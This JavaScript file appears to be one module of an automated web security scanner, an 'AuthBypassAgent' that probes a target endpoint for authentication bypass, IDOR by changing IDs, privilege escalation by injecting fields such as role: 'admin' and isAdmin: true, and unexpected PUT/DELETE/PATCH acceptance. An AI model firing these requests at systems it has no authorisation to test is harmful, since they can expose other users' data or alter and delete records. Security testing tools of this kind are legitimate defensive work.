const BaseAgent = require('../core/BaseAgent');
const axios = require('axios');

class AuthBypassAgent extends BaseAgent {
    constructor() {
        super('AuthBypassAgent', 'SPECIALIST');
    }

    async process(task) {
        if (task.type === 'TASK_ASSIGNED') {
            await this.executeAttack(task.payload);
            this.emitComplete();
        }
    }

    async executeAttack(payload) {
        this.log(`🔐 Testing Auth Bypass/BOLA: ${payload.url}`);

        // 1. Unauthenticated Access Test
        await this._testUnauthAccess(payload);

        // 2. IDOR via ID Manipulation
        await this._testIdorById(payload);

        // 3. Privilege Escalation (Role Manipulation)
        await this._testPrivEsc(payload);

        // 4. HTTP Method Override
        await this._testMethodOverride(payload);
    }

    async _testUnauthAccess(payload) {
        try {
            const resp = await this._sendRequest(payload.url, payload.method, payload.headers, payload.body, null);
            if (resp.status === 200 && resp.body.length > 50 &&
                !resp.body.includes('login') && !resp.body.includes('unauthorized') &&
                !resp.body.includes('sign in') && !resp.body.includes('403')) {
                this.verifyAndEmit(
                    {
                        type: 'AUTH_BYPASS', severity: 'CRITICAL', title: 'Authentication Bypass',
                        description: 'Endpoint accessible without auth tokens', endpoint: payload.url
                    },
                    { method: 'status_diff', evidence: `Status 200, Body len: ${resp.body.length}, Preview: ${resp.body.substring(0, 200)}` }
                );
            }
        } catch (e) { }
    }

    async _testIdorById(payload) {
        if (!payload.params || !payload.params.id) return;

        const originalId = payload.params.id;
        const testIds = [
            isNaN(originalId) ? null : String(parseInt(originalId) + 1),
            isNaN(originalId) ? null : String(parseInt(originalId) - 1),
            isNaN(originalId) ? null : String(parseInt(originalId) + 10),
            isNaN(originalId) ? null : '0',
            isNaN(originalId) ? null : '-1',
            '00000000-0000-0000-0000-000000000001'
        ].filter(Boolean);

        const originalResp = await this._sendRequest(payload.url, payload.method, payload.headers, payload.body, payload.cookies);

        for (const testId of testIds) {
            try {
                const urlObj = new URL(payload.url);
                urlObj.searchParams.set('id', testId);
                const testUrl = urlObj.toString();

                const testResp = await this._sendRequest(testUrl, payload.method, payload.headers, payload.body, payload.cookies);

                if (testResp.status === 200 && testResp.body.length > 50 &&
                    !testResp.body.includes('not found') && !testResp.body.includes('unauthorized')) {
                    const similarity = this._compareResponses(originalResp, testResp);
                    if (similarity > 0.3 && similarity < 0.95) {
                        // Similar structure, different data = IDOR
                        this.verifyAndEmit(
                            {
                                type: 'BOLA', severity: 'HIGH', title: 'IDOR / Broken Object-Level Authorization',
                                description: `Accessing ID ${testId} returned valid data (${Math.round(similarity * 100)}% similarity to ID ${originalId})`, endpoint: testUrl
                            },
                            { method: 'data_leak', evidence: `Original len: ${originalResp.body.length}, Test len: ${testResp.body.length}` }
                        );
                        break;
                    }
                }
            } catch (e) { }
        }
    }

    async _testPrivEsc(payload) {
        if (payload.method !== 'POST' && payload.method !== 'PUT' && payload.method !== 'PATCH') return;

        const privEscPayloads = [
            { role: 'admin' }, { isAdmin: true }, { is_admin: true },
            { role: 'administrator' }, { privilege: 'admin' }, { access_level: 999 }
        ];

        for (const escalation of privEscPayloads) {
            try {
                const mergedBody = { ...(payload.body || {}), ...escalation };
                const resp = await this._sendRequest(payload.url, payload.method, payload.headers, mergedBody, payload.cookies);

                if (resp.status === 200 && !resp.body.includes('unauthorized') && !resp.body.includes('forbidden')) {
                    this.verifyAndEmit(
                        {
                            type: 'PRIV_ESC', severity: 'CRITICAL', title: 'Privilege Escalation via Mass Assignment',
                            description: `Server accepted role override: ${JSON.stringify(escalation)}`, endpoint: payload.url, payload: JSON.stringify(escalation)
                        },
                        { method: 'status_diff', evidence: `Status: ${resp.status}, Body: ${resp.body.substring(0, 200)}` }
                    );
                    break;
                }
            } catch (e) { }
        }
    }

    async _testMethodOverride(payload) {
        const overrideMethods = ['PUT', 'DELETE', 'PATCH'];
        for (const method of overrideMethods) {
            if (method === payload.method) continue;
            try {
                const resp = await this._sendRequest(payload.url, method, payload.headers, payload.body, payload.cookies);
                if (resp.status === 200 || resp.status === 204) {
                    this.verifyAndEmit(
                        {
                            type: 'AUTH_BYPASS', severity: 'MEDIUM', title: `Unexpected ${method} Method Accepted`,
                            description: `Endpoint responds to ${method} (original: ${payload.method})`, endpoint: payload.url
                        },
                        { method: 'status_diff', evidence: `Status: ${resp.status}` }
                    );
                }
            } catch (e) { }
        }
    }

    _compareResponses(resp1, resp2) {
        if (resp1.status !== resp2.status) return 0;
        const maxLen = Math.max(resp1.body.length, resp2.body.length);
        if (maxLen === 0) return 1;
        const lenDiff = Math.abs(resp1.body.length - resp2.body.length);
        return 1 - (lenDiff / maxLen);
    }

    async _sendRequest(url, method, headers, data, cookies) {
        try {
            const config = {
                url, method: method || 'GET',
                headers: { ...headers, ...(cookies ? { Cookie: cookies } : {}) },
                data, timeout: 8000,
                validateStatus: () => true
            };
            const resp = await axios(config);
            return { status: resp.status, body: typeof resp.data === 'string' ? resp.data : JSON.stringify(resp.data) };
        } catch (e) {
            return { status: 0, body: e.message };
        }
    }
}

module.exports = new AuthBypassAgent();
